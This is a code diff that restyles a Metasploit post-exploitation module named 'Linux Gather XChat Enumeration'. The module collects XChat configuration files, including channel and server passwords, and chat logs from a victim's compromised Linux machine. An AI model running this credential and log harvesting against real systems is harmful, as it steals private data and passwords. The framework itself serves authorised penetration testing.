@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,33 +7,31 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Gather XChat Enumeration',
-      'Description'   => %q{
-          This module will collect XChat's config files and chat logs from the victim's
-        machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The
-        CONFIGS option can be used to collect information such as channel settings,
-        channel/server passwords, etc.  The CHATS option will simply download all the
-        .log files.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['sinn3r'],
-      'Platform'      => ['linux'],
-      # linux meterpreter is too busted to support right now,
-      # will come back and add support once it's more usable.
-      'SessionTypes'  => ['shell', 'meterpreter'],
-      'Actions'       =>
-        [
-          ['CONFIGS', { 'Description' => 'Collect XCHAT\'s config files' } ],
-          ['CHATS',   { 'Description' => 'Collect chat logs with a pattern' } ],
-          ['ALL',     { 'Description' => 'Collect both the plists and chat logs'}]
-        ],
-      'DefaultAction' => 'ALL'
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Linux Gather XChat Enumeration',
+                      'Description'   => %q(
+                          This module will collect XChat's config files and chat logs from the victim's
+                        machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The
+                        CONFIGS option can be used to collect information such as channel settings,
+                        channel/server passwords, etc.  The CHATS option will simply download all the
+                        .log files.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => ['sinn3r'],
+                      'Platform'      => ['linux'],
+                      # linux meterpreter is too busted to support right now,
+                      # will come back and add support once it's more usable.
+                      'SessionTypes'  => ['shell', 'meterpreter'],
+                      'Actions'       =>
+                        [
+                          ['CONFIGS', { 'Description' => 'Collect XCHAT\'s config files' } ],
+                          ['CHATS',   { 'Description' => 'Collect chat logs with a pattern' } ],
+                          ['ALL',     { 'Description' => 'Collect both the plists and chat logs' }]
+                        ],
+                      'DefaultAction' => 'ALL'))
   end
 
   def get_file(file)
@@ -58,12 +57,12 @@ class MetasploitModule < Msf::Post
       buf = ''
     end
 
-    return buf
+    buf
   end
 
   def whoami
     user = cmd_exec("/usr/bin/whoami").chomp
-    return user
+    user
   end
 
   def list_logs(base)
@@ -72,7 +71,7 @@ class MetasploitModule < Msf::Post
     return [] if list =~ /No such file or directory/
     files = list.scan(/\d+\x20\w{3}\x20\d+\x20\d{2}\:\d{2}\x20(.+)$/).flatten
 
-    return files
+    files
   end
 
   def save(type, data)
@@ -106,12 +105,12 @@ class MetasploitModule < Msf::Post
       vprint_status("#{@peer} - Downloading: #{l}")
       data = read_file(l)
       logs << {
-        :filename => l,
-        :data     => data
+        filename: l,
+        data: data
       }
     end
 
-    return logs
+    logs
   end
 
   def get_configs(base)
@@ -122,12 +121,12 @@ class MetasploitModule < Msf::Post
       buf = read_file(base + f)
       next if buf.blank?
       config << {
-        :filename => f,
-        :data     => buf
+        filename: f,
+        data: buf
       }
     end
 
-    return config
+    config
   end
 
   def run
@@ -152,13 +151,10 @@ class MetasploitModule < Msf::Post
     save(:configs, configs)   unless configs.empty?
     save(:chatlogs, chatlogs) unless chatlogs.empty?
   end
-
 end
 
-=begin
-Linux xchat path:
-/home/[username]/.xchat2/
-  * /home/[username]/.xchat2/servlist_.conf
-  * /home/[username]/.xchat2/xchat.conf
-  * /home/[username]/.xchat2/xchatlogs/FreeNode-#aha.log
-=end
+# Linux xchat path:
+# /home/[username]/.xchat2/
+#   * /home/[username]/.xchat2/servlist_.conf
+#   * /home/[username]/.xchat2/xchat.conf
+#   * /home/[username]/.xchat2/xchatlogs/FreeNode-#aha.log
